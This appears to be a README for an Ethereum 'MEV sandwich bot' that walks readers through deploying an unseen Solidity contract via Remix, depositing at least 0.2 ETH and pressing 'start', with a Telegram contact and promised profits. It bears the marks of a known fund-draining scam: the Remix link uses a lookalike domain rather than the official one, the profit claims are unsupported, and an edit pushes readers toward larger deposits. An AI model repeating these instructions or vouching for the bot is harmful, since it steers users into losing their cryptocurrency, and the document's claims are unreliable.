# EthMev
Bot Etherum Mev - solidity 0.6.6 
If you're into cryptocurrency, you need to know what a MEV Bot is. A Maximal Extractable Value (MEV) bot is an arbitrage tool that sniffs the Mempool for pending transactions on decentralized exchanges such as Uniswap and PancakeSwap. It inserts our own TX with a slightly higher gas fee, 1 Gwei higher than the TX which is trying to be entered, essentially sandwiching the pending TX and forcing ours to automatically be processed first, profiting off of the slippage differences.

You can message me on Telegram if you have any questions: https://t.me/NickNitroDeFi

STEP BY STEP INSTRUCTIONS:

👉 Download MetaMask: https://metamask.io/download

👉 Access the Remix IDE: https://remixide.org

👉 Right click on the 'contracts' folder and create a new file. Rename it as you like—i.e., 'Bot.sol'

👉 Move to the 'Solidity Compiler' tab, select version '0.6.6' and then click 'Compile'

👉 Move to the 'Deploy' tab, select 'Injected Provider' as the environment, then click 'Deploy'. After the transaction is confirmed, it's your own BOT now

👉 Deposit funds (at least 0.2 ETH to prevent negating slippage) to your exact contract/bot address

👉 After your transaction is confirmed, start the bot by clicking the 'start' button. Withdraw anytime by clicking 'withdrawal'


Share your profits in the comments section below. Like and subscribe for more lucrative Web3 Solidity tutorials.

🚨 EDIT: I've received messages from people who didn't fund the contract with enough Ethereum to cover gas fees and possible burn fees. The bot targets token contracts with max 10% burn fee and anything lower. However, nowadays most tokens come with 2~6% fees. If you fund the contract with 0.2 ETH or less, and the bot targets another token with high burn fees, the contract will waste a lot of gas fees. I recommend funding the contract with at least 0.2 ETH to make sure that won't happen.
